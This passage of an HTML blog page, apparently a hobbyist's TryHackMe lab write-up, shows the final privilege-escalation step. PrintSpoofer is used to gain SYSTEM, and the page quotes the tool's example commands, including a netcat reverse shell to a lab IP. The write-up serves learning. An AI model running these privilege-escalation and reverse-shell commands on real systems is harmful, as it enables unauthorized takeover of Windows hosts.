+  - Run PowerShell as SYSTEM in the current console
+      PrintSpoofer.exe -i -c powershell.exe
+  - Spawn a SYSTEM command prompt on the desktop of the session <span style="color:#ae81ff">1</span>
+      PrintSpoofer.exe -d <span style="color:#ae81ff">1</span> -c cmd.exe
+  - Get a SYSTEM reverse shell
+      PrintSpoofer.exe -c <span style="color:#e6db74">&#34;c:\Temp\nc.exe 10.10.13.37 1337 -e cmd&#34;</span>
+</code></pre></div><p>We know Powershell is installed, let&rsquo;s try that route by running: <code>PrintSpoofer64.exe -i -c powershell.exe</code></p>
+<p>It works! we have gained SYSTEM privileges</p>
+<p><img src="https://i.imgur.com/lKWNMAp.png" alt="We got root!"></p>
+<p>I can&rsquo;t fucking believe this, the VM died on my again!! right after the last step&hellip; :cry:
+<img src="https://media1.tenor.com/images/f723172484bf2e43ab1e7d3aa358d267/tenor.gif?itemid=14035982" alt=""></p>
+<p>I guess this room is a lesson on patience, perseverance, and decoy detection&hellip; Let&rsquo;s terminate and redeploy.</p>
+<p>I&rsquo;m gonna do this part super fast which means I won&rsquo;t be stopping to document much. Just know that I will basically re-do all steps to get <code>nt authority\system</code> permissions again. So it should all be documented well enough already.</p>
+<p>We did it, we got root and we got the last flag for the room:</p>
+<p><img src="https://i.imgur.com/ey7pfst.png" alt=""></p>
+<p>This was a tough one! I had to learn a lot to solve this one, made a lot of mistakes and even fall victim of some nice decoys set by TheMayor. This is honestly a great room, had to spent a couple of days to get through it. I don&rsquo;t really know if I have some connection issues with this particular box or if maybe I was doing something wrong that ended up causing the VM to block me somehow. if you know what I did wrong please leave a comment, I&rsquo;d love to read what you think of my writeups guys. I tried to learn from my mistakes, I&rsquo;m quite new at this and I&rsquo;m constantly learning new things to get better. Any advice or feedback would be greatly appreciated. Thanks to you for reading and thanks to TheMayor for this awesome room.</p>
+<p>I&rsquo;m gonna take some time to prep the report for this room, I&rsquo;m gonna be using the template shared by TheCyberMentor most likely. Once I have that ready I&rsquo;ll attach the report here.</p>
+<p>Thank you and Happy hacking!</p>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<br>
+<div class="container center" style="margin:10px !important;  text-align: center!important">
+    <div class="center">
+        <script src="https://tryhackme.com/badge/71634"></script>
+    </div>
+    <div class="center">
+        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
+        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <br> 
+    </div>
+</div>
+
+
+
+        <div class="footer">
+    Made with <a href="https://gohugo.io/">Hugo</a> with
+    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
+</div>
+
+    </div>
+  </body>
+</html>
